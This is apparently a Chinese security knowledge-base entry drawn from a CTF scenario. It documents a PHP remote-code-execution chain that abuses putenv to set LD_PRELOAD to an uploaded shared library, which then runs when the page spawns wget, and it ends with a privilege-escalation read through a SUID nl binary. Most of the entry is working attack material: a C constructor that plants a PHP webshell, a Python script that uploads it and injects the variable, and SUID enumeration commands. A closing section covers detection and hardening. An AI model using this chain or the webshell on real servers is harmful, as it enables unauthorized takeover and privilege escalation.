---
id: web-php-rce-putenv-fixed-filename-write-ldpreload-wget
title: PHP 任意 putenv + 固定文件名写文件：LD_PRELOAD 劫持 system(wget) 子进程 RCE 与 SUID nl 读取
type: scenario
domain: web
path: web/php/rce
technique: php-putenv-fixed-write-ldpreload-wget-trigger
aliases:
- putenv 任意环境变量
- file_put_contents 固定文件名
- LD_PRELOAD 劫持 wget
- system 子进程加载恶意 so
- PHP 无上传 LD_PRELOAD
- SUID nl 读文件
tags:
- php
- rce
- ld-preload
- putenv
- file-write
- wget
- glibc
- suid
- gtfobins
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:02+08:00'
  notes: 已对照原文核对：file_put_contents('1.txt',base64_decode(context)) + putenv 透传 + system(nohup wget) 触发 LD_PRELOAD 构造函数、绝对路径 /var/www/html/1.txt、SUID nl 提权，与原文源码/exp 一致。未验证点：未本机复跑环境；文中未给最终 flag；原文无受影响版本；frontmatter 无 sources/source_url。
---

## 一句话结论

PHP 同时提供“把 base64 内容写入固定文件名 `1.txt`”和“把用户输入整体传给 `putenv()`”两个原语时，可先写入一个带 `__attribute__((constructor))` 的共享库，再设置 `LD_PRELOAD=/绝对路径/1.txt`，随后页面固定执行的 `system("nohup wget ... &")` 会 fork/exec 出 `wget` 子进程，glibc 在子进程启动时加载该库并执行构造函数，从而以 Web 用户身份落盘 webshell 或执行命令。

## 原理

- `file_put_contents("1.txt", base64_decode($_POST['context']))` 允许写入任意二进制内容；文件名固定且相对当前工作目录，通常就是 Web 根目录，路径可预测（如 `/var/www/html/1.txt`）。
- `putenv($env)` 把用户提交的整串 `KEY=VALUE` 直接设为环境变量，既未限制键名，也未过滤 `LD_PRELOAD`。
- `system("nohup wget ... &")` 必然创建子进程；子进程继承 PHP 进程的环境变量。
- Linux glibc 动态链接器在启动动态链接的 ELF 时读取 `LD_PRELOAD`，按路径加载共享库；库的 `__attribute__((constructor))` 在加载阶段（`main` 之前）自动执行。
- 共享库不要求 `.so` 后缀：`LD_PRELOAD` 指向 `1.txt` 时，加载器按文件内容解析 ELF，扩展名不影响 `dlopen`。但必须是绝对路径（相对路径会按库搜索路径解析而失败）。
- 因此链条为：任意文件写（获得可预测路径的恶意 ELF）→ 任意环境变量（注入 `LD_PRELOAD`）→ 触发外部命令（`system`/`popan`/`mail`/`wget`）→ 构造函数执行。执行身份仍是 Web 进程用户，不是 root。
- 失败条件：目标为 musl/Alpine（`LD_PRELOAD` 行为不同或不可用）、PHP 进程为静态链接、架构/glibc 版本不兼容、`putenv` 被禁用、`system` 参数被更严格限制、文件写入目录不可预测或不可执行访问。

## 触发条件

- PHP 页面存在“写入固定/可预测路径的文件”和“把用户输入传给 `putenv()`”两个功能点。
- 页面或后续请求会执行外部命令（`system`、`shell_exec`、`passthru`、`popen`、`mail` 等），使子进程继承环境变量。
- 目标为 glibc 动态链接的 Linux，PHP 进程非 setuid（setuid 程序会忽略 `LD_PRELOAD`）。
- 攻击者能编译与目标架构一致的共享库，且写入的文件在 Web 根/任意可访问绝对路径下。
- 需要后续提权时，系统存在可被 GTFObins 利用的 SUID 程序（如 `nl`、`env`、`find` 等）。

## 利用步骤

1. 审计源码确认三个原语：固定文件名写入、`putenv` 透传、`system` 外部命令；确认 Web 根绝对路径（报错、默认配置、`phpinfo` 或路径猜测）。
2. 编译恶意共享库：构造函数中写入 webshell 或执行命令；用 `gcc -shared -fPIC -o evil.so evil.c`，`file` 确认架构与目标一致。
3. 把 `.so` 以 base64 形式 POST 给 `context`，使服务端写入 `1.txt`；用一次 GET 确认文件存在（或通过后续命令间接确认）。
4. POST `env=LD_PRELOAD=/var/www/html/1.txt`（必须是绝对路径），触发页面执行 `system("nohup wget ...")`。
5. 子进程 `wget` 启动时加载 `1.txt`，构造函数执行；访问落盘的 `shell.php` 或回连地址确认 RCE。
6. 提权：`find / -perm -4000 -type f 2>/dev/null` 查 SUID；若 `nl` 带 SUID，按 GTFObins 用 `nl /flag` 读取只有 root 可读的文件（或用 `env`、`find`、`awk` 等对应技巧）。
7. 清理写入的文件与环境变量影响，记录执行身份与权限边界。

## PoC

```c
// exploit.c —— 构造函数在加载时写入 webshell
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor)) void pwn(void) {
    FILE *f = fopen("/var/www/html/shell.php", "w");
    if (f) {
        fputs("<?php system($_POST['cmd']); ?>", f);
        fclose(f);
    }
}
```

```python
# 写入恶意库并注入 LD_PRELOAD，触发 system(wget) 子进程
import base64, requests, subprocess

subprocess.run(["gcc", "-shared", "-fPIC", "-o", "exploit.so", "exploit.c"], check=True)
so_b64 = base64.b64encode(open("exploit.so", "rb").read()).decode()

url = "http://target/"
r = requests.post(url, data={
    "context": so_b64,
    "env": "LD_PRELOAD=/var/www/html/1.txt",
})
print(r.status_code, r.text[:200])
# 之后访问 /shell.php，POST cmd=id 验证
```

```bash
# SUID 枚举与 GTFObins 读取
find / -perm -4000 -type f 2>/dev/null
/usr/bin/nl /flag          # 若 nl 为 SUID root，可直接读取
```

```text
注意：LD_PRELOAD 的值必须是绝对路径；1.txt 的绝对路径需按实际 Web 根调整。
若目标无出网，wget 的下载失败不影响子进程启动与构造函数执行。
```

## 变体与关联

- 变体：触发点换成 `mail()`、`mb_send_mail()`、`imap_open()`、`error_log()` 调用的外部程序，或任意 `system`/`exec` 调用。
- 变体：文件写入名不固定但可通过路径穿越/上传目录/日志投毒获得可预测路径；也可以先写 `.user.ini`/`.htaccess` 再配合其他解析。
- 变体：`putenv` 只能设置值、键被限制时，可尝试 `BASH_FUNC_<cmd>%%` 导出函数注入、`HOSTALIASES`（仅本机有效）、`http_proxy`（需出网）、`WGETRC`/`--execute`（需 wget 支持且配置可控）。
- 变体：`LD_PRELOAD` 不可用但 `LD_AUDIT` 可用时，可加载审计库执行代码。
- 关联：[[web-php-rce-disable-functions-ld-preload]]（disable_functions 场景下 putenv+mail 的同 sink 版本）、[[web-php-rce-putenv-bash-func-env-injection]]（putenv 注入 BASH_FUNC 导出函数）、[[pentest-privilege-escalation-sudo-allowed-program-gtfobins-escape]]（GTFObins 提权思路）。

## 检测与防御

- 修复：禁止用户控制 `putenv` 的键；对 `LD_PRELOAD` 等危险变量做白名单；不要用用户输入直接写固定路径文件。
- 加固：`disable_functions` 同时禁用 `putenv`、`system`、`mail` 等；`open_basedir` 限制写入目录；使用非 root Web 用户与只读文件系统。
- 加固：SUID 程序最小化，移除 `nl`/`env`/`find` 等不必要的 SUID 位；用 `nosuid` 挂载无关分区。
- 检测：Web 根出现 `1.txt` 等非预期 ELF 文件；进程环境含 `LD_PRELOAD`；Web 进程派生的 `wget`/`sh` 加载了非系统路径的共享库（`/proc/<pid>/maps`）。
- 响应：删除恶意文件、轮换凭据、审计 webshell 与提权痕迹；检查同目录其他固定文件名写入点。
